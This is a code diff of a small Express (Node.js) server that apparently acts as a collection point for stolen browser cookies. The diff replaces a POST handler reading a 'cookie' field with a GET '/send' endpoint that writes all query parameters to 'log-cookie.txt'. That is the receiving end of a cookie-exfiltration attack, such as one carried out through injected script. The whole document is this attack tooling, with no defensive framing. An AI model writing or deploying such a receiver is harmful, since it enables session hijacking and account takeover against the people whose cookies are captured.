@@ -9,24 +9,20 @@ app.get('/', function(req, res) {
     res.sendFile(path.join(__dirname + '/index.html'));
 });
 
+app.get('/send', function(req, res) {
+   console.log(req.query);
+   var json = JSON.stringify(req.query);
 
-app.post('/', function (req, res) {
-  var json = req.body.cookie;
-  
-  console.log(json);
-
-  fs.open('./log-cookie.txt', 'a', (err, fd) => {
+    fs.open('./log-cookie.txt', 'a', (err, fd) => {
   
     if (err) throw err;
-    fs.appendFile(fd, json + '\n', 'utf8', (err) => {
+    fs.appendFile(fd,  json + '\n', 'utf8', (err) => {
     fs.close(fd, (err) => {
       if (err) throw err;
     });
     if (err) throw err;
   });
 });
-
-  res.send('thanks');
-})
+});
 
 app.listen(3000, () => console.log('Example app listening on port 3000!'))
